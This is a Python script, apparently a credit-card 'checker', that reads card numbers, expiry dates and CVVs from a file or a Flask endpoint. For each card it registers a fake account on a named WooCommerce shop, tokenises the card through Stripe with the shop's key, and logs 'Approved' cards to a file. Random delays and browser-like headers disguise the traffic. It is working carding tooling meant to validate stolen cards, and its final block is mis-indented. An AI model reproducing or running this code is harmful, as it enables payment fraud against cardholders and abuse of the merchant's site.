import requests
import json
import re
import time
import random
import datetime
from typing import Dict, Any, Optional
from faker import Faker
from flask import Flask, request, jsonify

faker = Faker()

app = Flask(__name__)

# rashunter
def auto_request(
    url: str,
    method: str = 'GET',
    headers: Optional[Dict[str, str]] = None,
    data: Optional[Dict[str, Any]] = None,
    params: Optional[Dict[str, Any]] = None,
    json_data: Optional[Dict[str, Any]] = None,
    dynamic_params: Optional[Dict[str, Any]] = None,
    session: Optional[requests.Session] = None
) -> requests.Response:
    clean_headers = {}
    if headers:
        for key, value in headers.items():
            if key.lower() != 'cookie':
                clean_headers[key] = value
    
    if data is None:
        data = {}
    if params is None:
        params = {}

    if dynamic_params:
        for key, value in dynamic_params.items():
            if 'ajax' in key.lower():
                params[key] = value
            else:
                data[key] = value

    req_session = session if session else requests.Session()

    request_kwargs = {
        'url': url,
        'headers': clean_headers,
        'data': data if data else None,
        'params': params if params else None,
        'json': json_data,
        'cookies': {} 
    }

    request_kwargs = {k: v for k, v in request_kwargs.items() if v is not None}

    response = req_session.request(method, **request_kwargs)
    response.raise_for_status()
    
    return response

def extract_message(response: requests.Response) -> str:
    try:
        response_json = response.json()
        
        if 'message' in response_json:
            return response_json['message']
        
        for value in response_json.values():
            if isinstance(value, dict) and 'message' in value:
                return value['message']
        
        if "error" in response_json and "message" in response_json["error"]:
            return f"| {response_json['error']['message']}"

        return f"Message key not found. Full response: {json.dumps(response_json, indent=2)}"

    except json.JSONDecodeError:
        match = re.search(r'"message":"(.*?)"', response.text)
        if match:
            return match.group(1)
        
        return f"Response is not valid JSON. Status: {response.status_code}. Text: {response.text[:200]}..."
    except Exception as e:
        return f"An unexpected error occurred during message extraction: {e}"

def run_automated_process(card_num, card_cvv, card_yy, card_mm, user_ag, client_element, guid, muid, sid):
    session = requests.Session()
    base_url = 'https://dilaboards.com'
    
    print("Starting New Session Session => @RasHunter ")

    url_1 = f'{base_url}/en/moj-racun/add-payment-method/'
    headers_1 = {
        'User-Agent': user_ag,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Alt-Used': 'dilaboards.com',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',
    }
    
    try:
        response_1 = auto_request(url_1, method='GET', headers=headers_1, session=session)
        
        regester_nouce = re.findall('name="woocommerce-register-nonce" value="(.*?)"', response_1.text)[0]
        pk = re.findall('"key":"(.*?)"', response_1.text)[0]
        time.sleep(random.uniform(1.0, 3.0))
    except Exception as e:
        print(f"   - Request 1 Failed: {e}")
        return f"Request 1 Failed: {e}"

    url_2 = f'{base_url}/en/moj-racun/add-payment-method/'
    headers_2 = {
        'User-Agent': user_ag,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': base_url,
        'Alt-Used': 'dilaboards.com',
        'Connection': 'keep-alive',
        'Referer': url_1,
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',
    }
    data_2 = {
        'email': faker.email(domain="gamil.com"),
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': '(none)',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': url_1,
        'wc_order_attribution_session_start_time': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'wc_order_attribution_session_pages': '2',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': user_ag,
        'woocommerce-register-nonce': regester_nouce,
        '_wp_http_referer': '/en/moj-racun/add-payment-method/',
        'register': 'Register',
    }
    
    try:
        response_2 = auto_request(url_2, method='POST', headers=headers_2, data=data_2, session=session)
        
        ajax_nonce = re.findall('"createAndConfirmSetupIntentNonce":"(.*?)"', response_2.text)[0]
        time.sleep(random.uniform(1.0, 3.0))
    except Exception as e:
        print(f"   - Request 2 Failed: {e}")
        return f"Request 2 Failed: {e}"

    url_3 = 'https://api.stripe.com/v1/payment_methods'
    headers_3 = {
        'User-Agent': user_ag,
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://js.stripe.com/',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://js.stripe.com',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Priority': 'u=4',
    }
    
    data_3 = {
        'type': 'card',
        f'card[number]': card_num,
        f'card[cvc]': card_cvv,
        f'card[exp_year]': card_yy,
        f'card[exp_month]': card_mm,
        'allow_redisplay': 'unspecified',
        'billing_details[address][postal_code]': '11081',
        'billing_details[address][country]': 'US',
        'payment_user_agent': 'stripe.js/c1fbe29896; stripe-js-v3/c1fbe29896; payment-element; deferred-intent',
        'referrer': f'{base_url}',
        'time_on_page': str(random.randint(100000, 999999)), 
        'client_attribution_metadata[client_session_id]': client_element,
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
        'client_attribution_metadata[merchant_integration_version]': '2021',
        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
        'client_attribution_metadata[elements_session_config_id]': client_element,
        'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
        'guid': guid,
        'muid': muid,
        'sid': sid,
        'key': pk,
        '_stripe_version': '2024-06-20',
    }
    
    try:
        response_3 = auto_request(url_3, method='POST', headers=headers_3, data=data_3, session=session)
        
        pm = response_3.json()['id']
        time.sleep(random.uniform(1.0, 3.0))
    except Exception as e:
        print(f"   - Request 3 Failed: {e}")
        print(f"   - Response Text: {response_3.text if 'response_3' in locals() else 'No response'}")
        return f"Request 3 Failed: {e}"

    url_4 = f'{base_url}/en/'
    headers_4 = {
        'User-Agent': user_ag,
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': base_url,
        'Alt-Used': 'dilaboards.com',
        'Connection': 'keep-alive',
        'Referer': url_1,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
    }
    
    dynamic_params_4 = {
        'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': pm,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': ajax_nonce,
    }
    
    try:
        response_4 = auto_request(url_4, method='POST', headers=headers_4, dynamic_params=dynamic_params_4, session=session)
        
        msg = extract_message(response_4)
        status = "Approved" if response_4.json().get("success") else "Declined"
        
        if status == "Approved":
            with open('Approved.txt', 'a') as approved_file:
                approved_file.write(f"{card_num}|{card_mm}|{card_yy}|{card_cvv} - {status}\n")
        
        print(f"Your Card was {status} | Message: {msg}")
        
        return f"Your Card was {status} | Message: {msg}"
    except Exception as e:
        print(f"   - Request 4 Failed: {e}")
        print(f"   - Response Text: {response_4.text if 'response_4' in locals() else 'No response'}")
        return f"Request 4 Failed: {e}"

# --- NEW API ENDPOINT using GET with URL parameters ---
@app.route('/check', methods=['GET'])
def check_card_endpoint():
    # Get the card details from the URL query parameter `?card=...`
    card_str = request.args.get('card')
    if not card_str:
        return jsonify({"error": "Missing 'card' parameter. Format: ?card=CARD_NUMBER|CARD_EXP_MONTH|CARD_EXP_YEAR|CARD_CVV"}), 400
    
    parts = card_str.split('|')
    if len(parts) != 4:
        return jsonify({"error": "Invalid card format. Expected: CARD_NUMBER|CARD_EXP_MONTH|CARD_EXP_YEAR|CARD_CVV"}), 400
    
    CARD_NUMBER, CARD_EXP_MONTH, CARD_EXP_YEAR, CARD_CVV = parts
    
    USER_AGENT = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
    CLIENT_ELEMENT = 'src_1234567890abcdef' 
    GUID = 'guid_placeholder' 
    MUID = 'muid_placeholder' 
    SID = 'sid_placeholder' 
    
    result = run_automated_process(
        card_num=CARD_NUMBER,
        card_cvv=CARD_CVV,
        card_yy=CARD_EXP_YEAR,
        card_mm=CARD_EXP_MONTH,
        user_ag=USER_AGENT,
        client_element=CLIENT_ELEMENT,
        guid=GUID,
        muid=MUID,
        sid=SID
    )
    
    return jsonify({"result": result})

if __name__ == '__main__':
    # For local file processing (optional, comment out if only using API)
    USER_AGENT = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
    CLIENT_ELEMENT = 'src_1234567890abcdef' 
    GUID = 'guid_placeholder' 
    MUID = 'muid_placeholder' 
    SID = 'sid_placeholder' 

    with open('cc.txt', 'r') as file:
        for line in file:
            parts = line.strip().split('|')
            if len(parts) == 4:
                CARD_NUMBER, CARD_EXP_MONTH, CARD_EXP_YEAR, CARD_CVV = parts
                print(f"Processing: {CARD_NUMBER}|{CARD_EXP_MONTH}|{CARD_EXP_YEAR}|{CARD_CVV}")
                run_automated_process(
                    card_num=CARD_NUMBER,
                    card_cvv=CARD_CVV,
                    card_yy=CARD_EXP_YEAR,
                    card_mm=CARD_EXP_MONTH,
                    user_ag=USER_AGENT,
                    client_element=CLIENT_ELEMENT,
                    guid=GUID,
                    muid=MUID,
                    sid=SID
                )
    if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
    # Run the Flask app (uncomment to enable web access)
    # app.run(debug=True)
